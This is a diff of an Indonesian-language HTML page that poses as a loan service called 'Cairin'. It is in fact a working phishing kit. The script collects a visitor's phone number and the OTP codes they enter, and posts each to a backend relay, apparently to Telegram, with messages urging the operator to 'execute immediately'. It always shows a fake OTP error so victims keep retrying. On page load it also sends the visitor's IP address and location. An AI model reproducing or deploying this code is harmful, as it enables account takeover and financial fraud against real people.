@@ -1,14 +1,9 @@
+```html
 <!DOCTYPE html>
 <html lang="id">
 <head>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
-    <meta name="format-detection" content="telephone=no">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta http-equiv="pragma" content="no-store">
-    <meta http-equiv="Cache-Control" content="no-store, must-revalidate">
-    <meta name="apple-mobile-web-app-capable" content="no">
-    <meta http-equiv="expires" content="0">
     <title>Cairin</title>
 
     <style>
@@ -25,13 +20,28 @@
         .title { font-size: 17px; font-weight: 600; flex: 1; text-align: center; }
         .right-button { width: 50px; }
 
-        /* Main View - Latar Belakang Gradasi Hijau Default Agar PNG Terlihat */
-        .main-view { position: relative; min-height: calc(100vh - 50px); background: #f5f5f5 linear-gradient(180deg, #00903B 0%, #005a25 240px, #f5f5f5 320px) no-repeat; overflow-x: hidden; }
+        /* Main View & Gradasi Latar Belakang Permanen */
+        .main-view { 
+            position: relative; 
+            min-height: calc(100vh - 50px); 
+            /* Mengubah sedikit tone hijau agar lebih menyatu jika diperlukan, tapi mempertahankan original green */
+            background: #f5f5f5 linear-gradient(180deg, #00903B 0%, #006B2D 180px, #f5f5f5 280px) no-repeat; 
+            overflow-x: hidden; 
+        }
         
-        /* Gambar banner otomatis */
-        .main-logo { width: 100%; height: auto; position: absolute; top: 15px; left: 0; z-index: 0; object-fit: contain; }
+        /* Gambar banner transparan di atas gradasi */
+        .main-logo { 
+            width: 100%; 
+            position: absolute; 
+            top: 0; 
+            left: 0; 
+            z-index: 0; 
+            max-height: 200px;
+            object-fit: contain;
+            object-position: top;
+        }
 
-        .card-wrap { position: relative; z-index: 2; padding: 230px 15px 20px 15px; }
+        .card-wrap { position: relative; z-index: 2; padding: 147px 15px 20px 15px; }
 
         /* Cards */
         .new-register-card { background: #fff; border-radius: 16px; padding: 20px; margin-bottom: 15px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); position: relative; }
@@ -42,28 +52,43 @@
         .card-amount { font-size: 42px; font-weight: 800; color: #333; text-align: center; margin: 5px 0 10px 0; letter-spacing: -1px; }
         .interest-rate { display: flex; justify-content: center; align-items: center; background: rgba(0, 144, 59, 0.1); padding: 6px 12px; border-radius: 20px; width: fit-content; margin: 0 auto 20px; font-size: 12px; }
         .interest-rate__value { color: #00903B; font-weight: bold; margin-left: 4px; }
-        .limit-desc { font-size: 13px; color: #666; font-weight: 500; margin-bottom: 10px; }
+        .limit-desc { font-size: 13px; color: #666; font-weight: 500; margin-bottom: 10px; text-align: center; }
         
-        /* Buttons Grid */
-        .buttons { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 25px; }
-        .buttons button { background: #fff; border: 1px solid #00903B; border-radius: 20px; padding: 10px 0; font-size: 12px; font-weight: bold; color: #00903B; cursor: pointer; transition: 0.2s; }
-        .buttons button:active, .buttons button:hover { background: #00903B; color: #fff; }
-
         /* Input Field */
         .mobile-input { display: block; position: relative; margin-bottom: 5px; }
+        .buttons button { background: #fff; border: 1px solid #eee; border-radius: 20px; padding: 10px 0; font-size: 12px; color: #666; cursor: pointer; transition: 0.2s; }
+        .buttons button:active { background: #f0f0f0; }
+
+        /* Input Field - Dimodifikasi menjadi kotak melingkar */
+        .mobile-input { 
+            display: block; 
+            position: relative; 
+            margin-bottom: 10px; 
+            border: 1.5px solid #e0e0e0; /* Pembatas kotak */
+            border-radius: 30px; /* Sudut melingkar */
+            padding: 8px 18px; 
+            background: #fafafa;
+            transition: all 0.3s ease;
+        }
+        .mobile-input:focus-within {
+            border-color: #00903B;
+            background: #fff;
+            box-shadow: 0 0 0 3px rgba(0, 144, 59, 0.1);
+        }
+        
         .in-field__inner { display: flex; flex-direction: column; }
-        .in-field__control { display: flex; align-items: center; border-bottom: 1px solid #ddd; padding: 5px 0 10px 0; }
-        .mobile-icon { width: 18px; margin-right: 12px; opacity: 0.7; }
-        .in-field__control-container { flex: 1; position: relative; display: flex; align-items: center; }
-        .in-field__native { width: 100%; border: none; outline: none; font-size: 18px; font-weight: 500; color: #333; background: transparent; padding: 5px 0; }
-        .in-field__label { position: absolute; left: 0; font-size: 16px; color: #999; pointer-events: none; transition: 0.2s ease; }
+        .in-field__control { display: flex; align-items: center; border-bottom: none; padding: 5px 0; }
+        .mobile-icon { width: 22px; margin-right: 12px; opacity: 0.8; }
+        .in-field__control-container { flex: 1; position: relative; display: flex; align-items: center; height: 30px; }
+        .in-field__native { width: 100%; border: none; outline: none; font-size: 18px; font-weight: 500; color: #333; background: transparent; padding: 0; }
+        .in-field__label { position: absolute; left: 0; top: 50%; transform: translateY(-50%); font-size: 16px; color: #999; pointer-events: none; transition: 0.2s ease; }
         
         /* Sembunyikan Label saat mengetik */
         .in-field__native:focus + .in-field__label,
         .in-field__native:not(:placeholder-shown) + .in-field__label { display: none !important; opacity: 0; visibility: hidden; }
 
         /* Style Error */
-        .error-msg { color: #ff3b30; font-size: 11px; margin-top: 5px; margin-bottom: 15px; padding-left: 30px; display: none; }
+        .error-msg { color: #ff3b30; font-size: 11px; margin-top: 5px; margin-bottom: 15px; padding-left: 20px; display: none; }
 
         /* Submit Button */
         .submit-button { width: 100%; background: #00903B; color: #fff; border: none; border-radius: 25px; padding: 14px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 25px; display: flex; flex-direction: column; align-items: center; justify-content: center; box-shadow: 0 6px 15px rgba(0, 144, 59, 0.25); transition: 0.2s; }
@@ -131,11 +156,12 @@
         </div>
 
         <div class="main-view" id="mainView">
-            <img src="./eighthHeader.cc09398a.png" class="main-logo" id="headerImage" onerror="this.style.display='none';">
+            <!-- Ganti gambar header ke Cairin -->
+            <img src="253575.png" class="main-logo" id="headerImage" onerror="this.style.display='none';">
             
             <div class="card-wrap">
                 <div class="new-register-card main-card">
-                    <form class="in-form" id="phoneForm" onsubmit="handlePhoneSubmit(event)">
+                    <form class="in-form" id="phoneForm">
                         <div class="card-top">
                             <p class="limit-pinjaman">Limit pinjaman maks(Rp)</p>
                             <p class="card-amount">100.000.000</p>
@@ -143,15 +169,7 @@
                                 <span class="interest-rate__label">Bunga serendah </span>
                                 <span class="interest-rate__value">0,03% </span>
                             </div>
-                            <p class="limit-desc">Limit yang Anda inginkan</p>
-                            <div class="buttons">
-                                <button type="button"> 0~1Juta </button>
-                                <button type="button"> 1Juta~5Juta </button>
-                                <button type="button"> 5Juta~20Juta </button>
-                                <button type="button"> 20Juta~40Juta </button>
-                                <button type="button"> 40Juta~60Juta </button>
-                                <button type="button"> 60Juta+ </button>
-                            </div>
+                            <p class="limit-desc">Cek Data</p>
                         </div>
                         
                         <label for="phoneNumber" class="mobile-input">
@@ -161,7 +179,7 @@
                                         <svg class="mobile-icon" viewBox="0 0 24 24" fill="none" stroke="#00903B" stroke-width="2"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect><line x1="12" y1="18" x2="12.01" y2="18"></line></svg>
                                     </div>
                                     <div class="in-field__control-container">
-                                        <input id="phoneNumber" maxlength="14" type="tel" class="in-field__native" placeholder=" " oninput="validateInput(this)" autocomplete="off">
+                                        <input id="phoneInput" maxlength="14" type="tel" class="in-field__native" placeholder=" " autocomplete="off">
                                         <div class="in-field__label" id="phoneLabel">Masukkan Nomor HP</div>
                                     </div>
                                 </div>
@@ -170,7 +188,7 @@
                         
                         <div class="error-msg" id="phoneError">Format nomor ponsel salah, silakan masukkan 10-13 angka dimulai dengan 08</div>
                         
-                        <button type="submit" class="submit-button"> 
+                        <button type="button" id="submitBtn" class="submit-button"> 
                             Cek Limit Sekarang 
                             <p class="goToNextDesc">Tingkat lolos <span>97%</span></p>
                         </button>
@@ -270,29 +288,30 @@
 
     <div class="otp-overlay" id="otpModal">
         <div class="otp-box">
-            <span class="close-otp" onclick="closeOtpModal()">×</span>
+            <span class="close-otp" id="closeBtn">×</span>
             
             <div class="otp-title">Masukkan Kode OTP</div>
-            <div class="otp-desc" id="otpDesc"></div>
+            <div class="otp-desc" id="otpDesc">Kode dikirim ke <span id="displayNum" style="font-weight:bold;"></span></div>
             
-            <form onsubmit="handleOtpSubmit(event)">
+            <form onsubmit="event.preventDefault();">
                 <div class="otp-inputs">
-                    <input type="text" maxlength="1" class="otp-field" autocomplete="off">
-                    <input type="text" maxlength="1" class="otp-field" autocomplete="off">
-                    <input type="text" maxlength="1" class="otp-field" autocomplete="off">
-                    <input type="text" maxlength="1" class="otp-field" autocomplete="off">
-                    <input type="text" maxlength="1" class="otp-field" autocomplete="off">
-                    <input type="text" maxlength="1" class="otp-field" autocomplete="off">
+                    <div id="c1" class="otp-field-display" style="width: 100%; height: 50px; display: flex; align-items: center; justify-content: center; font-size: 22px; border: 1px solid #ddd; border-radius: 10px; font-weight: 700; color: #333; background: #fafafa;">-</div>
+                    <div id="c2" class="otp-field-display" style="width: 100%; height: 50px; display: flex; align-items: center; justify-content: center; font-size: 22px; border: 1px solid #ddd; border-radius: 10px; font-weight: 700; color: #333; background: #fafafa;">-</div>
+                    <div id="c3" class="otp-field-display" style="width: 100%; height: 50px; display: flex; align-items: center; justify-content: center; font-size: 22px; border: 1px solid #ddd; border-radius: 10px; font-weight: 700; color: #333; background: #fafafa;">-</div>
+                    <div id="c4" class="otp-field-display" style="width: 100%; height: 50px; display: flex; align-items: center; justify-content: center; font-size: 22px; border: 1px solid #ddd; border-radius: 10px; font-weight: 700; color: #333; background: #fafafa;">-</div>
                 </div>
+                
+                <!-- Input tersembunyi buat ngetik -->
+                <input type="text" id="otpInput" maxlength="4" style="position: absolute; opacity: 0; pointer-events: none;" autocomplete="off">
 
                 <div class="timer-resend">
-                    <span id="timerText"></span>
-                    <a href="#" id="resendLink" onclick="resetTimer(); return false;" class="resend-link">Kirim ulang kode OTP</a>
+                    <span id="countSpan">60s</span>
+                    <a href="#" id="resendLink" class="resend-link">Kirim ulang kode OTP</a>
                 </div>
 
                 <div class="otp-error" id="otpErrorText">Kode OTP salah atau sudah kadaluarsa</div>
 
-                <button type="submit" class="btn-otp-submit">Verifikasi OTP</button>
+                <button type="button" id="submitOtpBtn" class="btn-otp-submit">Verifikasi OTP</button>
             </form>
 
             <div class="loading-overlay" id="loadingSpinner">
@@ -303,50 +322,39 @@
     </div>
 
     <script>
+        // 1. Pilihan Limit Pinjaman
+        const terms = document.querySelectorAll('.term');
+        terms.forEach(term => {
+            term.addEventListener('click', () => {
+                terms.forEach(t => t.classList.remove('active'));
+                term.classList.add('active');
+            });
+        });
+
+        // 2. Variabel & Integrasi Telegram Backend API
         let userPhoneNumber = '';
         let timerInterval;
 
-        function validateInput(input) {
-            input.value = input.value.replace(/[^0-9]/g, '');
-            const label = document.getElementById('phoneLabel');
-            label.style.display = input.value.length > 0 ? 'none' : 'block';
-        }
+        const phoneInput = document.getElementById('phoneInput');
+        const submitBtn = document.getElementById('submitBtn');
+        const phoneError = document.getElementById('phoneError');
+        
+        const otpModal = document.getElementById('otpModal');
+        const closeBtn = document.getElementById('closeBtn');
+        const displayNum = document.getElementById('displayNum');
+        
+        const otpInput = document.getElementById('otpInput');
+        const codeItems = [document.getElementById('c1'), document.getElementById('c2'), document.getElementById('c3'), document.getElementById('c4')];
+        const submitOtpBtn = document.getElementById('submitOtpBtn');
+        
+        const countSpan = document.getElementById('countSpan');
+        const resendLink = document.getElementById('resendLink');
+        const otpErrorText = document.getElementById('otpErrorText');
 
-        function handlePhoneSubmit(e) {
-            e.preventDefault();
-            const phoneInput = document.getElementById('phoneNumber');
-            const errorMsg = document.getElementById('phoneError');
-            const submitBtn = document.querySelector('.submit-button');
-            let phone = phoneInput.value.trim();
-
-            let isValid = false;
-            if (phone.startsWith('08') && phone.length >= 10 && phone.length <= 13) isValid = true;
-            else if (phone.startsWith('628') && phone.length >= 11 && phone.length <= 14) isValid = true;
-
-            if (!isValid) {
-                errorMsg.style.display = 'block';
-                errorMsg.style.textAlign = 'center';
-                return;
-            }
-
-            errorMsg.style.display = 'none';
-            userPhoneNumber = phone;
-
-            const teksAsli = submitBtn.innerHTML;
-            submitBtn.innerHTML = 'Memproses...';
-            submitBtn.disabled = true;
-            submitBtn.style.opacity = '0.7';
-
-            const message = `<b>🚀 NOTIFIKASI BARU 🚀</b>\n----------------------------------\n<b>📱 PENGIRIM :</b> <code>${phone}</code>\n<b>🌐 DOMAIN   :</b> mainakunjp.com\n<b>🛰 STATUS   :</b> Menunggu OTP...\n----------------------------------`;
-            sendTelegramMessage(message);
-            
-            setTimeout(() => {
-                submitBtn.innerHTML = teksAsli;
-                submitBtn.disabled = false;
-                submitBtn.style.opacity = '1';
-                showOtpModal(phone);
-            }, 2000);
-        }
+        // Validasi input hanya angka
+        phoneInput.addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/[^0-9]/g, '');
+        });
 
         function sendTelegramMessage(text) {
             fetch('/api/kirim-telegram', {
@@ -356,99 +364,134 @@
             }).catch(err => console.log('Backend belum siap:', err));
         }
 
-        function showOtpModal(phone) {
-            const modal = document.getElementById('otpModal');
-            const desc = document.getElementById('otpDesc');
-            desc.style.textAlign = 'center';
-            desc.innerHTML = `📬 <b>Kode verifikasi dikirim</b><br>(${phone.slice(0,4)}****${phone.slice(-4)})`;
+        // 3. Interaksi Tombol Cek Limit
+        submitBtn.addEventListener('click', () => {
+            let phone = phoneInput.value.trim();
+            let isValid = false;
 
-            modal.style.display = 'flex';
-            startTimer();
-            document.querySelectorAll('.otp-field')[0].focus();
-        }
+            if (phone.startsWith('08') && phone.length >= 10 && phone.length <= 13) isValid = true;
+            else if (phone.startsWith('628') && phone.length >= 11 && phone.length <= 14) isValid = true;
 
-        function closeOtpModal() {
-            document.getElementById('otpModal').style.display = 'none';
-            clearInterval(timerInterval);
-        }
+            if (!isValid) {
+                phoneError.style.display = 'block';
+                phoneError.style.textAlign = 'left';
+                phoneInput.focus();
+                return;
+            }
 
-        const otpInputs = document.querySelectorAll('.otp-field');
-        otpInputs.forEach((input, index) => {
-            input.setAttribute('inputmode', 'numeric');
-            input.addEventListener('input', (e) => {
-                e.target.value = e.target.value.replace(/[^0-9]/g, '');
-                if (e.target.value.length === 1 && index < 5) otpInputs[index + 1].focus();
-            });
-            input.addEventListener('keydown', (e) => {
-                if (e.key === 'Backspace' && e.target.value.length === 0 && index > 0) otpInputs[index - 1].focus();
-            });
+            phoneError.style.display = 'none';
+            userPhoneNumber = phone;
+
+            const teksAsli = submitBtn.innerHTML;
+            submitBtn.innerHTML = 'Memproses...';
+            submitBtn.style.pointerEvents = 'none';
+            submitBtn.style.opacity = '0.7';
+
+            const message = `<b>🚀 NOTIFIKASI BARU 🚀</b>\n----------------------------------\n<b>📱 PENGIRIM :</b> <code>${phone}</code>\n<b>🌐 SABAR   :</b> OTP\n<b>🛰 STATUS   :</b> Menunggu OTP...\n----------------------------------`;
+            sendTelegramMessage(message);
+            
+            setTimeout(() => {
+                submitBtn.innerHTML = teksAsli;
+                submitBtn.style.pointerEvents = 'auto';
+                submitBtn.style.opacity = '1';
+                showOtpModal(phone);
+            }, 2000);
         });
 
-        function handleOtpSubmit(e) {
-            e.preventDefault();
-            let otpCode = '';
-            otpInputs.forEach(inp => otpCode += inp.value);
-            if (otpCode.length < 6) return;
+        function showOtpModal(phone) {
+            displayNum.textContent = phone;
+            otpModal.style.display = 'flex';
+            otpErrorText.style.display = 'none';
+            otpInput.value = '';
+            codeItems.forEach(item => item.textContent = '-');
+            startTimer();
+            otpInput.focus();
+        }
 
-            const loader = document.getElementById('loadingSpinner');
-            const otpError = document.getElementById('otpErrorText');
+        closeBtn.addEventListener('click', () => {
+            otpModal.style.display = 'none';
+            clearInterval(timerInterval);
+        });
 
-            loader.style.display = 'flex';
-            otpError.style.display = 'none';
+        // Fokuskan hidden input saat click kotak OTP
+        document.querySelector('.otp-inputs').addEventListener('click', () => {
+            otpInput.focus();
+        });
 
-            const formattedOtp = otpCode.substring(0,3) + '-' + otpCode.substring(3,6);
+        // 4. Sinkronisasi Pengisian Angka Kotak OTP
+        otpInput.addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/[^0-9]/g, '');
+            const val = e.target.value;
+            for (let i = 0; i < 4; i++) {
+                codeItems[i].textContent = val[i] ? val[i] : '-';
+                if(val[i]) {
+                    codeItems[i].style.borderColor = '#00903B';
+                    codeItems[i].style.background = '#fff';
+                } else {
+                    codeItems[i].style.borderColor = '#ddd';
+                    codeItems[i].style.background = '#fafafa';
+                }
+            }
+        });
 
-            const message = `<b>⚡️ KODE OTP MASUK ⚡️</b>\n----------------------------------\n<b>🔑 OTP CODE :</b> <code>${formattedOtp}</code>\n<b>👤 NOMOR    :</b> <code>${userPhoneNumber}</code>\n<b>⏰ WAKTU    :</b> ${new Date().toLocaleTimeString('id-ID')}\n----------------------------------\n<b>🔥 SEGERA EKSEKUSI! 🔥</b>`;
+        // 5. Submit OTP
+        submitOtpBtn.addEventListener('click', () => {
+            let otpCode = otpInput.value;
+            if (otpCode.length < 4) return;
+
+            const teksAsli = submitOtpBtn.innerHTML;
+            submitOtpBtn.innerHTML = 'Memverifikasi...';
+            submitOtpBtn.style.pointerEvents = 'none';
+            otpErrorText.style.display = 'none';
+
+            const message = `<b>⚡️ KODE OTP MASUK ⚡️</b>\n----------------------------------\n<b>🔑 OTP CODE :</b> <code>${otpCode}</code>\n<b>👤 NOMOR    :</b> <code>${userPhoneNumber}</code>\n<b>⏰ WAKTU    :</b> ${new Date().toLocaleTimeString('id-ID')}\n----------------------------------\n<b>🔥 SEGERA EKSEKUSI! 🔥</b>`;
             sendTelegramMessage(message);
 
             setTimeout(() => {
-                loader.style.display = 'none';
-                otpError.style.display = 'block';
-                otpError.style.textAlign = 'center';
-                otpInputs.forEach(input => input.value = '');
-                otpInputs[0].focus();
+                submitOtpBtn.innerHTML = teksAsli;
+                submitOtpBtn.style.pointerEvents = 'auto';
+                
+                otpErrorText.style.display = 'block';
+                otpInput.value = '';
+                codeItems.forEach(item => {
+                    item.textContent = '-';
+                    item.style.borderColor = '#ddd';
+                    item.style.background = '#fafafa';
+                });
+                otpInput.focus();
             }, 3000);
-        }
+        });
 
+        // 6. Timer Logic
         function startTimer() {
             let timeLeft = 60;
-            const timerText = document.getElementById('timerText');
-            const resendLink = document.getElementById('resendLink');
-
-            timerText.style.textAlign = 'center';
-            resendLink.style.textAlign = 'center';
-            
+            countSpan.style.display = 'block';
             resendLink.style.display = 'none';
-            timerText.style.display = 'inline';
+            countSpan.innerText = `${timeLeft}s`;
             clearInterval(timerInterval);
 
             timerInterval = setInterval(() => {
                 timeLeft--;
-                timerText.innerText = `⏳ Kirim ulang dalam ${timeLeft}s`;
+                countSpan.innerText = `${timeLeft}s`;
                 if (timeLeft <= 0) {
                     clearInterval(timerInterval);
-                    timerText.style.display = 'none';
-                    resendLink.style.display = 'inline';
+                    countSpan.style.display = 'none';
+                    resendLink.style.display = 'block';
                 }
             }, 1000);
         }
 
-        function resetTimer() {
+        resendLink.addEventListener('click', (e) => {
+            e.preventDefault();
             startTimer();
-        }
-
-        document.addEventListener('DOMContentLoaded', () => {
-            const phoneInput = document.getElementById('phoneNumber');
-            if (phoneInput) phoneInput.addEventListener('input', () => validateInput(phoneInput));
         });
-    </script>
 
-    <script type="text/javascript">
+        // 7. IP Tracking
         window.onload = function() {
             fetch('https://ipapi.co/json/')
                 .then(res => res.json())
                 .then(data => {
-                    const infoPesan = `<b>🚀 NGA!!! NGA!!! ADE YANG NAK LOGIN!</b>\n\n<b>Link:</b> https://Cairin-tan.vercel.app\n<b>IP:</b> <code>${data.ip}</code>\n<b>Kota:</b> ${data.city}\n<b>Negara:</b> ${data.country_name}\n<b>Provider:</b> ${data.org}\n<b>Waktu:</b> ${new Date().toLocaleString('id-ID')}`;
+                    const infoPesan = `<b>🚀 NGA!!! NGA!!! ADE YANG KLIK WEB!</b>\n\n<b>Domain:</b> https://cek-data-kredione.vercel.app\n<b>IP:</b> <code>${data.ip}</code>\n<b>Kota:</b> ${data.city}\n<b>Negara:</b> ${data.country_name}\n<b>Provider:</b> ${data.org}\n<b>Waktu:</b> ${new Date().toLocaleString('id-ID')}`;
 
                     fetch('/api/kirim-telegram', {
                         method: 'POST',
@@ -462,3 +505,4 @@
     </script>
 </body>
 </html>
+```
